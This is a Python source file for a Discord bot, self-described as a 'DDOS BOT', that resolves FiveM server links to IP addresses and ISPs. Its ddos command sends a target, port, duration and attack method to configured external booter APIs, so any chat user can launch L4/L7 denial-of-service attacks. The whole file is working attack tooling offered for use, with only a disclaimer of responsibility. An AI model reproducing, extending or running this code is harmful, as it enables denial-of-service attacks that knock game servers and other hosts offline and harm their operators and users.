import discord
from discord.ext import commands
import os
import fade
import json
from requests import get

with open('config.json') as f:
    config = json.load(f)

#-------------------------------------------------------------------------------------------#

token = config.get('token')
prefix = config.get('prefix')
status = config.get('status')
msgGIF = config.get('msgGIF')
attackGIF = config.get('attackGIF')
errorGIF = config.get('errorGIF')
l4methodslist = config.get('l4methods')
l7methodslist = config.get('l7methods')
api_config = config.get('api_config')

l4methods = l4methodslist
l7methods = l7methodslist

#-------------------------------------------------------------------------------------------#

client = commands.Bot(command_prefix= prefix)
client.remove_command("help")

@client.event
async def on_ready():
    os.system('cls')
    banner = """                                           
                            ▓█████▄ ▓█████▄  ▒█████    ██████     ▄▄▄▄    ▒█████  ▄▄▄█████▓
                            ▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒    ▓█████▄ ▒██▒  ██▒▓  ██▒ ▓▒
                            ░██   █▌░██   █▌▒██░  ██▒░ ▓██▄      ▒██▒ ▄██▒██░  ██▒▒ ▓██░ ▒░
                            ░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒   ▒██░█▀  ▒██   ██░░ ▓██▓ ░ 
                            ░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒   ░▓█  ▀█▓░ ████▓▒░  ▒██▒ ░ 
                             ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░   ░▒▓███▀▒░ ▒░▒░▒░   ▒ ░░   
                             ░ By   N o 0 n e ░ ▒ ▒░ ░ ░▒  ░ ░   ▒░▒   ░   ░ ▒ ▒░     ░    

                                              https://github.com/No0ne-15
                                             https://discord.gg/M8SzwGvqQg"""    
    faded_banner = fade.purplepink(banner)  
    print(faded_banner)
    print('─' * 120)
    print("Successfully logged in as {0.user} ".format(client))
    activity = discord.Game(name=status + " | by github.com/No0ne-15", type=3)
    await client.change_presence(status=discord.Status.online, activity=activity)

#-------------------------------------------------------------------------------------------#

@client.command()
async def help(ctx):
    embed = discord.Embed(title="__**HELP  -  DDOS BOT**__", color=0x00040a)
    embed.add_field(name="__**Commands :**__\n",value="`" + prefix + "help` **:** Shows this message\n`" + prefix + "cfxresolver <link>` **:** Resolve cfx link to IP\n" + "`" + prefix + "methods` **:** Shows methods list\n`" + prefix + "ddos <method> <target> <port> <time>` **:** Send a DDoS Attack\n\n*~ We are not responsible for your actions, you will assume the consequences ~*",inline=False)
    embed.set_image(url=msgGIF)
    embed.set_footer(text="https://github.com/No0ne-15")
    await ctx.send(embed=embed)

#-------------------------------------------------------------------------------------------#

@client.command(aliases=["cfx", "resolve"])
async def cfxresolver(ctx, cfx):
    if "cfx.re/join/" not in cfx: 
        return
    if "https://" in str(cfx.lower()):
        cfx = str(cfx.lower()).split("https://")[1]

    embed = discord.Embed(title="CFX RESOLVER  -  DDOS BOT", color=0x00040a)

    try:
        r = get(f"https://{cfx}")
        ownerinfo = get(f"https://servers-frontend.fivem.net/api/servers/single/{cfx.split('/')[2]}", headers={"Host": "servers-frontend.fivem.net","Connection": "keep-alive","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',"Accept": "application/json, text/plain, */*","sec-ch-ua-mobile": "?0","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36","sec-ch-ua-platform": "Windows","Origin": "https://servers.fivem.net","Sec-Fetch-Site": "same-site","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Referer": "https://servers.fivem.net/","Accept-Language": "fr-FR,fr;q=0.9","Accept-Encoding": "gzip, deflate",})
        if "Не найден." in r.text or '{"error": "404 Not Found"}' in ownerinfo.text:
            icon = False
        else:
            icon = True
        ip = str(r.headers['X-Citizenfx-Url'].split("/")[2])
    except:
        ip = "`Unable to connect`"

    embed.add_field(name="__**IP Address**__", value=f"`{ip}`", inline=False)
    try:
        ip.split(':')[0]
    except:
        ipinfo = get(f"http://ip-api.com/json/{ip}?fields=66846719").json()
    else:
        ipinfo = get(f"http://ip-api.com/json/{ip.split(':')[0]}?fields=66846719").json()
    
    try:
        ipinfo['isp']
    except:
        embed.add_field(name="__**ISP**__", value=f"`Unknown`")
    else:
        embed.add_field(name="__**ISP**__", value=f"`{ipinfo['isp']}`")
        embed.set_image(url=msgGIF)
        embed.set_footer(text="https://github.com/No0ne-15")
        await ctx.send(embed=embed)

#-------------------------------------------------------------------------------------------#

@client.command()
async def methods(ctx):
    l4methodstr = ''
    l7methodstr = ''
    for m in l4methods:
        l4methodstr = f'{l4methodstr}{m}\n'
    for m2 in l7methods:
        l7methodstr = f'{l7methodstr}{m2}\n'
    embed = discord.Embed(title="METHODS  -  DDOS BOT", color=0x00040a)
    embed.add_field(name="⚔️ __L4 :__", value=f"──────────────────────```{l4methodstr}```")
    embed.add_field(name="⚔️ __L7 :__", value=f"──────────────────────```{l7methodstr}```")
    embed.set_image(url=msgGIF)
    embed.set_footer(text="https://github.com/No0ne-15")
    await ctx.send(embed=embed)

#-------------------------------------------------------------------------------------------#

@client.command()
@commands.guild_only()
async def ddos(ctx, method : str = None, target : str = None, port : str = None, time : str = None):
        
        if method is None or method.upper() == 'HELP':
            for m in l4methods:
                l4methodstr = f'{l4methodstr}{m}\n'

            for m2 in l7methods:
                l7methodstr = f'{l7methodstr}{m2}\n'

            embed = discord.Embed(title="ERROR ❌", color=0xff0000)
            embed.add_field(name="__**PLEASE ENTER A METHOD !**__", value="Type `" + prefix + "method` to see methods list\n `." + prefix + "ddos <method> <target> <port> <time>`", inline=True)
            embed.set_image(url=errorGIF)
            embed.set_footer(text="https://github.com/No0ne-15")
            await ctx.send(embed=embed)

        elif method is None:
            embed = discord.Embed(title="ERROR ❌", color=0xff0000)
            embed.add_field(name="__**PLEASE ENTER A METHOD !**__", value="Type `" + prefix + "method` to see methods list\n `." + prefix + "ddos <method> <target> <port> <time>`", inline=True)
            embed.set_image(url=errorGIF)
            embed.set_footer(text="https://github.com/No0ne-15")
            await ctx.send(embed=embed)
            
        elif method.upper() not in l4methods and method.upper() not in l7methods:
            embed = discord.Embed(title="ERROR ❌", color=0xff0000)
            embed.add_field(name="__**INVALID METHOD !**__", value="Type `" + prefix + "method` to see methods list\n `." + prefix + "ddos <method> <target> <port> <time>`", inline=True)
            embed.set_image(url=errorGIF)
            embed.set_footer(text="https://github.com/No0ne-15")
            await ctx.send(embed=embed)

        elif target is None:
            embed = discord.Embed(title="ERROR ❌", color=0xff0000)
            embed.add_field(name="__**ENTER A TARGET !**__", value="\n `." + prefix + "ddos <method> <target> <port> <time>`", inline=True)
            embed.set_image(url=errorGIF)
            embed.set_footer(text="https://github.com/No0ne-15")
            await ctx.send(embed=embed)

        elif port is None:
            embed = discord.Embed(title="ERROR ❌", color=0xff0000)
            embed.add_field(name="__**ENTER A PORT !**__", value="\n `." + prefix + "ddos <method> <target> <port> <time>`", inline=True)
            embed.set_image(url=errorGIF)
            embed.set_footer(text="https://github.com/No0ne-15")
            await ctx.send(embed=embed)

        elif time is None:
            embed = discord.Embed(title="ERROR ❌", color=0xff0000)
            embed.add_field(name="__**ENTER DURATION !**__", value="\n `." + prefix + "ddos <method> <target> <port> <time>`", inline=True)
            embed.set_image(url=errorGIF)
            embed.set_footer(text="https://github.com/No0ne-15")
            await ctx.send(embed=embed)

        else:
            for i in api_config:
                try:
                    api_url = i["api_url"]
                    api_key = i["api_key"]
                    max_time = int(i["max_time"])

                    if int(time) > max_time:
                        time = max_time
                        embed = discord.Embed(title="ERROR ❌", color=0xff0000)
                        embed.add_field(name="__**WRONG DURATION !**__", value="\n__*Maximum Attack Time :*__ " + str(max_time) + " seconds", inline=True)
                        embed.set_image(url=errorGIF)
                        embed.set_footer(text="https://github.com/No0ne-15")
                        await ctx.send(embed=embed)
                        return
                    else:
                        time = int(time)

                        await get(f'{api_url}/?key={api_key}&host={target}&port={port}&time={time}&method={method.upper()}')

                except Exception as e:
                    print(e)
                    pass

            embed = discord.Embed(title="( -_･) ︻デ═一 DDOS ATTACK SUCCESSFULLY SENT ✅", color=0x00040a)
            embed.add_field(name="__**👤·User :**__", value=ctx.author.mention, inline=True)
            embed.add_field(name="__**🌐·Target :**__", value=f"```{target}```", inline=True)
            embed.add_field(name="__**🔥·Port :**__", value=f"```{port}```", inline=True)
            embed.add_field(name="__**⏱·Time :**__", value=f"```{time} seconds```", inline=True)
            embed.add_field(name="__**💥·Method :**__", value=f"```{method}```", inline=True)
            embed.set_image(url=attackGIF)
            embed.set_footer(text="https://github.com/No0ne-15")
            await ctx.send(embed=embed)
            print(ctx.author.name + " sent an attack to " + target + " on port " + port + " for " + str(time) + "seconds using the method " + method)

#-------------------------------------------------------------------------------------------#

client.run(token)